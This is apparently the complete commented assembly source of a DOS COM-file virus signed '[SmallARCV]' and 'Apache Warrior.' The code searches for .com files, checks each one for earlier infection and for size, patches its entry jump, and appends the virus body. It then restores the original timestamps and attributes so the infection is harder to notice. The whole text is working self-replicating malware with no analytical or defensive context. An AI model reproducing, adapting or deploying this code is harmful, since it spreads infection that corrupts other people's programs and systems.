
                .radix 16
                .model tiny
                .code
                org     100h

main:
        jmp     start
start:
        call    get_pointer                      ;>>xref=<06106><<

get_pointer:
        pop     bp                      ; pop cs:ip of stack
        sub     bp,offset get_pointer   ; adjust

        lea     si,word ptr [bp+old_jump]; loc of old jump
        mov     di,0100h                ; where to put it
        push    di                      ; save on stack for later return
        movsw
        movsb

        mov     ah,1ah                  ; set DTA
        lea     dx,word ptr ss:d061ef[bp] ;
        int     21h

        lea     dx,[bp+com_file]        ; COM filespec
        mov     ah,4eh                  ; find first file
        mov     cx,0007h                ; all attributes

find_loop:
        int     21h                     ;

        jb      set_dta                  ; none found then jump.

        call    open_file                      ; open the file

        mov     ah,3fh                  ; read from file
        lea     dx,word ptr ss:d0621a[bp] ; store here
        mov     cx,001ah                ; number of bytes
        int     21h

        mov     ah,3eh                  ; close the file
        int     21h

        mov     ax,word ptr ss:d06209[bp] ; get file siz
        cmp     ax,0feceh               ; cmp to 65k.
        ja      find_next                  ; to big then forget it.

        mov     bx,word ptr ss:d0621b[bp] ; get jump loc in file
        add     bx,00efh                ; add virus size
        cmp     ax,bx                   ; does it equal file size?

        jne     infect_com                  ; nope then get file

find_next:
        mov     ah,4fh                  ; find next file
        jmp     short find_loop

set_dta:
        mov     ah,1ah                  ; set dta
        mov     dx,80h                  ; to original position
        int     21h
        ret

old_jump:
        int     20h                     ; original jump
        db      00                      ; original file so its an int 20h.
 
set_attribute:
        mov     ax,4301h                ; set file attr.
        lea     dx,word ptr ss:d0620d[bp] ; filename
        int     21h                     ; cl has attribs
        ret


sig     db      '[SmallARCV]',0
        db      'Apache Warrior.',0
com_file db      '*.com',0               ; com filespec

open_file:
        mov     ax,3d02h                ; open file read/write
        lea     dx,word ptr ss:d0620d[bp] ; location of filename
        int     21h
        xchg    ax,bx                   ; handle -> bx
        ret

infect_com:
        mov     cx,0003h                ; # of bytes to write
        sub     ax,cx                   ; adjust filesize for jmp.
        lea     si,word ptr ss:d0621a[bp] ; victims original jmp
        lea     di,word ptr old_jump[bp]  ; place here
        movsw                           ; move it
        movsb
        mov     byte ptr [si-03],0e9h   ; set up new jump
        mov     word ptr [si-02],ax     ; and save it

        push    cx                      ; save # of bytes to write
        xor     cx,cx                   ; clear attributes
        call    set_attribute                      ; set attributes
        call    open_file                      ; open file
        mov     ah,40h                  ; write to file
        lea     dx,word ptr ss:d0621a[bp] ; new jump
        pop     cx                      ; get bytes off stack
        int     21h

        mov     ax,4202h                ; move fpointer to end
        xor     cx,cx                   ; clear these
        cwd                             ; clear dx
        int     21h

        mov     ah,40h                  ; write to file
        lea     dx,word ptr start[bp]   ; from here.
        mov     cx,00ech                ; size of virus
        int     21h

        mov     ax,5701h                ; set files date/time back
        mov     cx,word ptr ss:d06205[bp] ;
        mov     dx,word ptr ss:d06207[bp] ;
        int     21h

        mov     ah,3eh                  ; close file
        int     21h

        mov     ch,00                   ; set attributes back
        mov     cl,byte ptr ss:d06204[bp] ; original attribs.
        call    set_attribute                      ; set them back
        jmp     set_dta                  ; jump and quit virus.

d061ef          equ     001efh 
d06204          equ     00204h 
d06205          equ     00205h 
d06207          equ     00207h 
d06209          equ     00209h 
d0620d          equ     0020dh 
d0621a          equ     0021ah 
d0621b          equ     0021bh 

                end     main
